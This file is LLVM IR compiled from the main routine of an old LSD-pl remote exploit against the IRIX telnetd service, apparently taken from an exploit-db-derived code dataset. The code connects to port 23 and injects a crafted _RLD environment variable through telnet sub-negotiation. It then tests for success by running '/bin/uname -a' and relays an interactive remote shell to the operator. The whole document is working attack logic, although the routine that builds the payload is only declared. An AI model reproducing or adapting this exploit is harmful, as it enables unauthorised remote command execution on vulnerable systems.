; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/irix/remote/extr_20149.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/irix/remote/extr_20149.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i8* }
%struct.hostent = type { i8* }
%struct.sockaddr_in = type { %struct.TYPE_3__, i32, i32 }
%struct.TYPE_3__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM jul 2000 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [48 x i8] c"telnetd for irix 6.2 6.3 6.4 6.5 6.5.8 IP:all\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [36 x i8] c"usage: %s address [-v 62|63|64|65]\0A\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"sc:p:v:\00", align 1
@optarg = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [2 x i8] c".\00", align 1
@stdout = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@EADDRNOTAVAIL = common dso_local global i64 0, align 8
@errno = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.6 = private unnamed_addr constant [11 x i8] c"\FF\FA$\00\01XXXX\00\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"%s\FF\F0\00", align 1
@env_value = common dso_local global i8* null, align 8
@.str.8 = private unnamed_addr constant [15 x i8] c"\FF\FA$\00\01_RLD\00%s\FF\F0\00", align 1
@.str.9 = private unnamed_addr constant [57 x i8] c"error: telnet service seems to be used with tcp wrapper\0A\00", align 1
@.str.10 = private unnamed_addr constant [15 x i8] c"/bin/uname -a\0A\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"\0A%s\0A\0A\00", align 1
@tab1 = common dso_local global %struct.TYPE_4__* null, align 8
@.str.12 = private unnamed_addr constant [24 x i8] c"\0Aerror: not vulnerable\0A\00", align 1
@FD_SETSIZE = common dso_local global i32 0, align 4
@EWOULDBLOCK = common dso_local global i64 0, align 8
@EAGAIN = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [1024 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.hostent*, align 8
  %15 = alloca %struct.sockaddr_in, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 65, i32* %13, align 4
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.1, i64 0, i64 0))
  %21 = load i32, i32* %4, align 4
  %22 = icmp slt i32 %21, 2
  br i1 %22, label %23, label %29

23:                                               ; preds = %2
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i64 0, i64 0), i8* %26)
  %28 = call i32 @exit(i32 -1) #3
  unreachable

29:                                               ; preds = %2
  br label %30

30:                                               ; preds = %42, %29
  %31 = load i32, i32* %4, align 4
  %32 = sub nsw i32 %31, 1
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = call i32 @getopt(i32 %32, i8** %34, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  store i32 %35, i32* %8, align 4
  %36 = icmp ne i32 %35, -1
  br i1 %36, label %37, label %43

37:                                               ; preds = %30
  %38 = load i32, i32* %8, align 4
  switch i32 %38, label %42 [
    i32 118, label %39
  ]

39:                                               ; preds = %37
  %40 = load i32, i32* @optarg, align 4
  %41 = call i32 @atoi(i32 %40)
  store i32 %41, i32* %13, align 4
  br label %42

42:                                               ; preds = %39, %37
  br label %30

43:                                               ; preds = %30
  %44 = load i32, i32* %13, align 4
  switch i32 %44, label %49 [
    i32 62, label %45
    i32 63, label %46
    i32 64, label %47
    i32 65, label %48
  ]

45:                                               ; preds = %43
  store i32 0, i32* %10, align 4
  store i32 5, i32* %11, align 4
  br label %51

46:                                               ; preds = %43
  store i32 6, i32* %10, align 4
  store i32 8, i32* %11, align 4
  br label %51

47:                                               ; preds = %43
  store i32 9, i32* %10, align 4
  store i32 10, i32* %11, align 4
  br label %51

48:                                               ; preds = %43
  store i32 11, i32* %10, align 4
  store i32 12, i32* %11, align 4
  br label %51

49:                                               ; preds = %43
  %50 = call i32 @exit(i32 -1) #3
  unreachable

51:                                               ; preds = %48, %47, %46, %45
  %52 = load i32, i32* %10, align 4
  store i32 %52, i32* %7, align 4
  br label %53

53:                                               ; preds = %160, %51
  %54 = load i32, i32* %7, align 4
  %55 = load i32, i32* %11, align 4
  %56 = icmp sle i32 %54, %55
  br i1 %56, label %57, label %163

57:                                               ; preds = %53
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  %59 = load i32, i32* @stdout, align 4
  %60 = call i32 @fflush(i32 %59)
  %61 = load i32, i32* @AF_INET, align 4
  %62 = load i32, i32* @SOCK_STREAM, align 4
  %63 = call i32 @socket(i32 %61, i32 %62, i32 0)
  store i32 %63, i32* %9, align 4
  %64 = load i32, i32* @AF_INET, align 4
  %65 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 2
  store i32 %64, i32* %65, align 4
  %66 = call i32 @htons(i32 23)
  %67 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 1
  store i32 %66, i32* %67, align 4
  %68 = load i8**, i8*** %5, align 8
  %69 = getelementptr inbounds i8*, i8** %68, i64 1
  %70 = load i8*, i8** %69, align 8
  %71 = call i32 @inet_addr(i8* %70)
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  %73 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %72, i32 0, i32 0
  store i32 %71, i32* %73, align 4
  %74 = icmp eq i32 %71, -1
  br i1 %74, label %75, label %93

75:                                               ; preds = %57
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 1
  %78 = load i8*, i8** %77, align 8
  %79 = call %struct.hostent* @gethostbyname(i8* %78)
  store %struct.hostent* %79, %struct.hostent** %14, align 8
  %80 = icmp eq %struct.hostent* %79, null
  br i1 %80, label %81, label %85

81:                                               ; preds = %75
  %82 = load i64, i64* @EADDRNOTAVAIL, align 8
  store i64 %82, i64* @errno, align 8
  %83 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0))
  %84 = call i32 @exit(i32 -1) #3
  unreachable

85:                                               ; preds = %75
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  %87 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %86, i32 0, i32 0
  %88 = bitcast i32* %87 to i8*
  %89 = load %struct.hostent*, %struct.hostent** %14, align 8
  %90 = getelementptr inbounds %struct.hostent, %struct.hostent* %89, i32 0, i32 0
  %91 = load i8*, i8** %90, align 8
  %92 = call i32 @memcpy(i8* %88, i8* %91, i32 4)
  br label %93

93:                                               ; preds = %85, %57
  %94 = load i32, i32* %9, align 4
  %95 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %96 = call i64 @connect(i32 %94, %struct.sockaddr* %95, i32 12)
  %97 = icmp slt i64 %96, 0
  br i1 %97, label %98, label %101

98:                                               ; preds = %93
  %99 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i64 0, i64 0))
  %100 = call i32 @exit(i32 -1) #3
  unreachable

101:                                              ; preds = %93
  %102 = load i32, i32* %7, align 4
  %103 = call i32 @prepare_env(i32 %102)
  store i32 %103, i32* %12, align 4
  %104 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %105 = call i32 @memcpy(i8* %104, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i64 0, i64 0), i32 10)
  %106 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 10
  %107 = load i8*, i8** @env_value, align 8
  %108 = call i32 @sprintf(i8* %106, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0), i8* %107)
  %109 = load i32, i32* %9, align 4
  %110 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %111 = load i32, i32* %12, align 4
  %112 = add nsw i32 10, %111
  %113 = add nsw i32 %112, 2
  %114 = call i32 @write(i32 %109, i8* %110, i32 %113)
  %115 = call i32 @sleep(i32 1)
  %116 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %117 = call i32 @memcpy(i8* %116, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0), i32 10)
  %118 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 10
  %119 = load i8*, i8** @env_value, align 8
  %120 = call i32 @sprintf(i8* %118, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i64 0, i64 0), i8* %119)
  %121 = load i32, i32* %9, align 4
  %122 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %123 = load i32, i32* %12, align 4
  %124 = add nsw i32 10, %123
  %125 = add nsw i32 %124, 2
  %126 = call i32 @write(i32 %121, i8* %122, i32 %125)
  %127 = load i32, i32* %9, align 4
  %128 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %129 = call i32 @read(i32 %127, i8* %128, i32 1024)
  store i32 %129, i32* %12, align 4
  %130 = icmp slt i32 %129, 2
  br i1 %130, label %136, label %131

131:                                              ; preds = %101
  %132 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %133 = load i8, i8* %132, align 16
  %134 = sext i8 %133 to i32
  %135 = icmp ne i32 %134, 255
  br i1 %135, label %136, label %139

136:                                              ; preds = %131, %101
  %137 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.9, i64 0, i64 0))
  %138 = call i32 @exit(i32 -1) #3
  unreachable

139:                                              ; preds = %131
  %140 = load i32, i32* %9, align 4
  %141 = call i32 @write(i32 %140, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.10, i64 0, i64 0), i32 14)
  %142 = load i32, i32* %9, align 4
  %143 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %144 = call i32 @read(i32 %142, i8* %143, i32 1024)
  store i32 %144, i32* %12, align 4
  %145 = icmp sgt i32 %144, 0
  br i1 %145, label %146, label %157

146:                                              ; preds = %139
  %147 = load %struct.TYPE_4__*, %struct.TYPE_4__** @tab1, align 8
  %148 = load i32, i32* %7, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %147, i64 %149
  %151 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %150, i32 0, i32 0
  %152 = load i8*, i8** %151, align 8
  %153 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0), i8* %152)
  %154 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %155 = load i32, i32* %12, align 4
  %156 = call i32 @write(i32 1, i8* %154, i32 %155)
  br label %163

157:                                              ; preds = %139
  %158 = load i32, i32* %9, align 4
  %159 = call i32 @close(i32 %158)
  br label %160

160:                                              ; preds = %157
  %161 = load i32, i32* %7, align 4
  %162 = add nsw i32 %161, 1
  store i32 %162, i32* %7, align 4
  br label %53

163:                                              ; preds = %146, %53
  %164 = load i32, i32* %7, align 4
  %165 = load i32, i32* %11, align 4
  %166 = icmp sgt i32 %164, %165
  br i1 %166, label %167, label %170

167:                                              ; preds = %163
  %168 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.12, i64 0, i64 0))
  %169 = call i32 @exit(i32 -1) #3
  unreachable

170:                                              ; preds = %163
  br label %171

171:                                              ; preds = %170, %194, %218, %225
  %172 = call i32 @FD_ZERO(i32* %16)
  %173 = call i32 @FD_SET(i32 0, i32* %16)
  %174 = load i32, i32* %9, align 4
  %175 = call i32 @FD_SET(i32 %174, i32* %16)
  %176 = load i32, i32* @FD_SETSIZE, align 4
  %177 = call i64 @select(i32 %176, i32* %16, i32* null, i32* null, i32* null)
  %178 = icmp ne i64 %177, 0
  br i1 %178, label %179, label %225

179:                                              ; preds = %171
  %180 = call i64 @FD_ISSET(i32 0, i32* %16)
  %181 = icmp ne i64 %180, 0
  br i1 %181, label %182, label %201

182:                                              ; preds = %179
  %183 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i64 0, i64 0
  %184 = call i32 @read(i32 0, i8* %183, i32 1024)
  store i32 %184, i32* %17, align 4
  %185 = icmp slt i32 %184, 1
  br i1 %185, label %186, label %196

186:                                              ; preds = %182
  %187 = load i64, i64* @errno, align 8
  %188 = load i64, i64* @EWOULDBLOCK, align 8
  %189 = icmp eq i64 %187, %188
  br i1 %189, label %194, label %190

190:                                              ; preds = %186
  %191 = load i64, i64* @errno, align 8
  %192 = load i64, i64* @EAGAIN, align 8
  %193 = icmp eq i64 %191, %192
  br i1 %193, label %194, label %195

194:                                              ; preds = %190, %186
  br label %171

195:                                              ; preds = %190
  br label %226

196:                                              ; preds = %182
  %197 = load i32, i32* %9, align 4
  %198 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i64 0, i64 0
  %199 = load i32, i32* %17, align 4
  %200 = call i32 @write(i32 %197, i8* %198, i32 %199)
  br label %201

201:                                              ; preds = %196, %179
  %202 = load i32, i32* %9, align 4
  %203 = call i64 @FD_ISSET(i32 %202, i32* %16)
  %204 = icmp ne i64 %203, 0
  br i1 %204, label %205, label %224

205:                                              ; preds = %201
  %206 = load i32, i32* %9, align 4
  %207 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i64 0, i64 0
  %208 = call i32 @read(i32 %206, i8* %207, i32 1024)
  store i32 %208, i32* %17, align 4
  %209 = icmp slt i32 %208, 1
  br i1 %209, label %210, label %220

210:                                              ; preds = %205
  %211 = load i64, i64* @errno, align 8
  %212 = load i64, i64* @EWOULDBLOCK, align 8
  %213 = icmp eq i64 %211, %212
  br i1 %213, label %218, label %214

214:                                              ; preds = %210
  %215 = load i64, i64* @errno, align 8
  %216 = load i64, i64* @EAGAIN, align 8
  %217 = icmp eq i64 %215, %216
  br i1 %217, label %218, label %219

218:                                              ; preds = %214, %210
  br label %171

219:                                              ; preds = %214
  br label %226

220:                                              ; preds = %205
  %221 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i64 0, i64 0
  %222 = load i32, i32* %17, align 4
  %223 = call i32 @write(i32 1, i8* %221, i32 %222)
  br label %224

224:                                              ; preds = %220, %201
  br label %225

225:                                              ; preds = %224, %171
  br label %171

226:                                              ; preds = %219, %195
  %227 = load i32, i32* %3, align 4
  ret i32 %227
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @atoi(i32) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @prepare_env(i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
